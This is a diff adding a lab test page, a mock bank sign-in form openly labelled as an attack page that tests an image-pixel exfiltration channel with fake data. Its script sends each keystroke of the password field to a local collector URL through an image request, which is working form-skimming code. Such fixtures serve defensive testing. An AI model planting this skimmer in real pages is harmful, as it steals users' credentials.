@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formosa Demo Bank - Sign in</title></head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - tests the image-pixel channel. Fake data only.</p>
+
+  <form action="http://127.0.0.1:8003/noop" method="post">
+    <input name="username" placeholder="Username">
+    <input name="password" type="password" placeholder="Password">
+    <button type="submit">Sign in</button>
+  </form>
+
+  <script>
+    // Exfiltrate via an IMAGE request: the typed value rides in the URL query.
+    const pw = document.querySelector('input[name="password"]');
+    pw.addEventListener("input", () => {
+      new Image().src = "http://127.0.0.1:8002/collect?k=" + encodeURIComponent(pw.value);
+    });
+  </script>
+</body></html>
